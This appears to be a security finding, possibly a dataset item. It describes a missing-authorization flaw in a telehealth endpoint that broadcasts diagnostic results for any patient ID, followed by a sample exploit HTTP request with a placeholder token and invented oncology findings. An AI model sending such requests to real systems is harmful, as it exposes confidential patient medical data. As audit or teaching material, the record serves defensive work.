diagnosis: The telehealth lab notification endpoint publishes confidential medical diagnostic results to an AWS SNS topic using patientId supplied directly in the request body. It does not verify that the authenticated physician or practitioner is assigned to treat the designated patient. Any authenticated user can trigger broadcasts of medical findings for arbitrary patient identifiers.
exploit_request:
POST /api/telehealth/broadcast-report HTTP/1.1
Host: clinic.telehealth.internal:3001
Authorization: Bearer <unauthorized_clinician_token>
Content-Type: application/json

{
  "patientId": "pat_oncology_88219",
  "testCategory": "Biopsy",
  "diagnosticFindings": "Malignant melanoma stage 3 detected",
  "urgencyLevel": "CRITICAL"
}
